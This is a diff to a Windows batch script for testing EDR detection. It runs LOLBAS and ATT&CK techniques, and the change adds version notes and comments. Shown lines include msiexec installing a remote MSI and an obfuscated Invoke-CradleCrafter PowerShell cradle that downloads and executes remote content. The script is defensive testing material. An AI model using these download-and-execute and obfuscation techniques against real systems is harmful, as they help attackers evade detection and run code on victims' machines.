@@ -1,15 +1,27 @@
 REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries
 REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
 REM Author: op7ic
-REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
-REM Warning: You might have to click on few windows to close script execution. Don't run this on live system instead run this in a VM with EDR installed!
-REM Version: 0.3a
+REM Description:
+REM Test the detection of various scripts/downloads/execs against your EDR solution.
+REM
+REM Warning:
+REM You might have to click on few windows to close script execution. Don't run this on live system instead run this in a VM with EDR installed!
+REM
+REM Version: 0.4a
+REM
+REM Version History:
+REM 0.4a - Added Invoke-CradleCrafter payloads
+REM 0.3a - More LOLBAS checks 
+REM 0.2a - More ATT&CK / LOLBAS checks
+REM      - Mapped out available tests in README.md
+REM 0.1a - Basic ATT&CK / LOLBAS checks addded
+
 
 
 echo **********************************************
 echo *          EDR Testing Script                *
-echo *          Version: 0.3a                     *
-echo *          by: op7ic                         *
+echo *          Version: 0.4a                     *
+echo *          author: op7ic                     *
 echo *                                            *
 echo *                                            *
 echo *                                            *
@@ -315,13 +327,10 @@ echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.ex
 timeout 5
 
 
-T1129 (application manifest)
-
-
-
 echo **********************************************
 echo *      Testing LOLBAS PAYLOADS               *
 echo **********************************************
+REM Payloads in this section were generated based on information in https://github.com/api0cradle/LOLBAS
 
 echo %time% %date% [+] Testing msiexec exec
 start "" cmd /c msiexec /q /i https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
@@ -460,11 +469,13 @@ echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
 REM Reset ComSpec
 set comspec=C:\WINDOWS\system32\cmd.exe
 
-
+REM ---- EOF LOLBAS Payloads ----
 
 echo **********************************************
 echo *    Testing Invoke-CradleCrafter PAYLOADS   *
 echo **********************************************
+
+REM Payloads in this section were generated using https://github.com/danielbohannon/Invoke-CradleCrafter.
 
 echo %time% %date% [+] Testing MEMORY\PSWEBSTRING exec
 start "" cmd /c powershell -c "Set-Item Variable:\FW 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';dir ect*;SI Variable:/d (.(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).PsObject.Methods|Where{(ChildItem Variable:/_).Value.Name-ilike'*Co*d'}).Name).Invoke((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'*man*Name'}).Name).Invoke('*w-*ct',$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)Net.WebClient);(LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name).(((LS Variable:/E*tex*).Value.(((LS Variable:/E*tex*).Value|Get-Member)[6].Name)|Get-Member|Where{(ChildItem Variable:/_).Value.Name-ilike'I*t'}).Name).Invoke((Variable d -Va).((((Variable d -Va)|Get-Member)|Where{(ChildItem Variable:/_).Value.Name-ilike'*wn*g'}).Name).Invoke((Get-Item Variable:/FW).Value))" 
@@ -552,7 +563,7 @@ start "" cmd /c powershell -c "SV c3z 'https://raw.githubusercontent.com/op7ic/E
 echo Execution Finished at %time% %date%
 timeout 5
 
-
+REM ---- EOF Invoke-CradleCrafter Payloads ----
 
 echo [+] Let tasks finish before deleting all the files
 
